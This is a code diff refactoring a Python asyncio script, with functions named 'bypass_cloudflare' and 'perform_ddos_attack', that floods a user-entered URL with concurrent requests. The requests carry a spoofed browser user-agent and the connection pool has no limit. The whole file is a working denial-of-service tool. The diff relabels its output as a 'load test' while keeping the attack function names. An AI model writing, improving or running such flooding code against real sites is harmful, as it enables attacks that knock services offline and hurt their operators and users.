@@ -1,7 +1,7 @@
 import aiohttp
 import asyncio
-import os
 import time
+import os
 
 auth = """
  ▄▀▀█▄▄   ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄ 
@@ -10,42 +10,52 @@ auth = """
   █    █   █    █ ▀▄    ▄▀ ▀▄   █  
  ▄▀▄▄▄▄▀  ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀   
 █     ▐  █     ▐            ▐      
-▐        ▐                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+▐        ▐                        
 """
 
-async def bypass_cloudflare(target_url):
-    async with aiohttp.ClientSession() as session:
-        headers = {'user-agent': 'Mozilla/4.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/11.0.1245.0 Safari/537.36'}
-        async with session.get(target_url, headers=headers) as response:
-            return await response.text()
+async def bypass_cloudflare(session, target_url):
+    headers = {
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36'
+    }
+    async with session.get(target_url, headers=headers) as response:
+        return response.status
+
+async def worker(target_url, session, queue):
+    while not queue.empty():
+        _ = await queue.get()
+        try:
+            status = await bypass_cloudflare(session, target_url)
+            print(f"\033[32m[+] Request successful: {status}")
+        except Exception:
+            print(f"\033[31m[-] Request failed")
 
 async def perform_ddos_attack(target_url, num_requests, num_threads):
-    success_count = 0
-    failure_count = 0
-    lock = asyncio.Lock()
+    queue = asyncio.Queue()
+    for _ in range(num_requests):
+        queue.put_nowait(1)
 
-    async def worker():
-        nonlocal success_count, failure_count
-        for _ in range(num_requests // num_threads):
-            try:
-                bypassed_content = await bypass_cloudflare(target_url)
-                async with lock:
-                    success_count += 1
-                    print(f"\033[32m[+] Request successful: {success_count}")
-            except Exception as e:
-                async with lock:
-                    failure_count += 1
-                    print(f"\033[31m[-] Failed request: {failure_count}")
+    conn = aiohttp.TCPConnector(limit=0)
+    timeout = aiohttp.ClientTimeout(total=10)
+    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
+        tasks = [asyncio.create_task(worker(target_url, session, queue)) for _ in range(num_threads)]
+        await asyncio.gather(*tasks)
 
-    await asyncio.gather(*(worker() for _ in range(num_threads)))
-
-while True:
+async def main():
     os.system("cls||clear")
-    print(auth)
-    target_url = input("\033[32mEnter the anyone address: \x1b[0m").strip()
-    num_threads = int(input("\033[32mHow many requests should it send per second: \x1b[0m").strip())
-    num_requests = int(input("\033[32mHow many requests should be made in total: \x1b[0m").strip())
+    while True:
+        print(auth)
+        target_url = input("\033[32mEnter the target URL: \x1b[0m").strip()
+        num_threads = int(input("\033[32mThreads per second: \x1b[0m").strip())
+        num_requests = int(input("\033[32mTotal number of requests: \x1b[0m").strip())
 
-    asyncio.run(perform_ddos_attack(target_url, num_requests, num_threads))
-    print("\n\x1b[31mthe program is restarting. Waiting for 5 seconds...\x1b[0m")
-    time.sleep(5)
+        print("\n\x1b[34mStarting load test...\x1b[0m")
+        start_time = time.time()
+        await perform_ddos_attack(target_url, num_requests, num_threads)
+        duration = time.time() - start_time
+
+        print(f"\n\x1b[32mTest completed in {duration:.2f} seconds.\x1b[0m")
+        print("\n\x1b[31mRestarting in 5 seconds...\x1b[0m")
+        await asyncio.sleep(5)
+
+if __name__ == "__main__":
+    asyncio.run(main())
